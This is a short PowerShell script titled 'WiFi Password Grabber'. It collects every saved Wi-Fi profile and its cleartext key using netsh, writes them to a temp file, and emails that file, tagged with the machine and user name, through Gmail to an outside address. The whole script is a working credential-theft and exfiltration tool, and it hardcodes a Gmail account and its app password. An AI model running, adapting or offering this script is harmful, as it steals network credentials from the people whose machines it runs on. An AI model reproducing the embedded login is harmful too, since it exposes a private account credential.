<#
Title:         WiFi Password Grabber
Description:   Collects WiFi profiles and passwords
Author:        Zero_Sploit
Version:       1.0
#>

# Change to user profile directory
Set-Location $env:USERPROFILE

# Get all WiFi profiles
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(':')[1].Trim()
}

# Create a log file
$logFile = "$env:TEMP\WifiLog.txt"

# Clear log file if exists
"" | Out-File -FilePath $logFile -Force

# For each profile, get the password
foreach ($profile in $profiles) {
    $profileInfo = netsh wlan show profile name="$profile" key=clear
    $passwordLine = $profileInfo | Select-String "Key Content"
    
    if ($passwordLine) {
        $password = $passwordLine.ToString().Split(':')[1].Trim()
    } else {
        $password = "No password"
    }
    
    # Write to log file
    "SSID: $profile" | Out-File -FilePath $logFile -Append
    "Password: $password" | Out-File -FilePath $logFile -Append
    "------------------------" | Out-File -FilePath $logFile -Append
}

# Email settings - Using Gmail with App Password
$smtp = "smtp.gmail.com"
$From = "harisoncane@gmail.com"
$To = "efeaslan1995@gmail.com"
$Subject = "WiFi Passwords Report - $env:COMPUTERNAME"
$Body = "WiFi passwords collected from $env:COMPUTERNAME ($env:USERNAME)"

# Use the app password for Gmail
$appPassword = "zdfeitrgdejhktrc"
$SecurePassword = ConvertTo-SecureString $appPassword -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($From, $SecurePassword)

try {
    # Send the email via Gmail (SSL required)
    Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body `
        -Attachments $logFile -SmtpServer $smtp -Port 587 `
        -UseSsl -Credential $Credential -Encoding UTF8
    
    Write-Host "WiFi report sent successfully!" -ForegroundColor Green
} catch {
    Write-Host "Failed to send email: $_" -ForegroundColor Red
    
    # Alternative: Show the collected data
    Write-Host "`nCollected WiFi Data:" -ForegroundColor Yellow
    Get-Content $logFile | Write-Host -ForegroundColor Cyan
}

# Cleanup: delete the log file (optional)
# Remove-Item $logFile -Force

# Exit
Write-Host "`nScript completed." -ForegroundColor Gray